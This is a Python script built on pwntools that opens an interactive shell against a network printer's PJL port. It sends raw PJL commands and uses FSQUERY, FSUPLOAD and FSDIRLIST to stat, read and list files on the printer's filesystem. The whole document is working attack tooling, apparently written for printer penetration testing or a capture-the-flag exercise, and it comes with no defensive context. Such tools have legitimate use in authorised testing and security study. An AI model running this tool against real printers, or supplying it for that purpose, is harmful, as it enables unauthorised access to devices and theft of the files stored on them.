from pwn import *
import argparse
import cmd

class PJLShell(cmd.Cmd):
    prompt = "> "

    def __init__(self, host: str, port: int):
        super().__init__()
        self._host = host
        self._port = port
        self._timeout = 0.5

    def _get_response(self, r) -> str:
        return r.recvall(timeout=self._timeout).replace(b'\r\n', b'\n').decode('ascii')

    def _print_response(self, r):
        print(self._get_response(r))

    def _exec_and_print(self, cmd: str):
        print(self._exec(cmd))

    def _exec(self, cmd: str) -> str:
        r = remote(self._host, self._port)
        print(f"sending {cmd}")
        r.sendline(cmd.encode())
        return self._get_response(r)

    @context.quiet
    def do_raw(self, line):
        self._exec_and_print(f"@PJL {line}")

    @context.quiet
    def do_stat(self, path):
        self._exec_and_print(f'@PJL FSQUERY NAME="0:/{path}"')

    @context.quiet
    def do_cat(self, path):
        size = self._exec(f'@PJL FSQUERY NAME="0:/{path}"').split(' ')[-1]
        self._exec_and_print(f'@PJL FSUPLOAD NAME="0:/{path}" OFFSET=0 {size}')

    @context.quiet
    def do_ls(self, path):
        self._exec_and_print(f'@PJL FSDIRLIST NAME="0:/{path}" ENTRY=1 COUNT=65535')

    def do_timeout(self, timeout):
        self._timeout = float(timeout.strip())


if __name__ == "__main__":
    parser = argparse.ArgumentParser("PJL Shell")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)

    args = parser.parse_args()

    PJLShell(args.host, args.port).cmdloop()
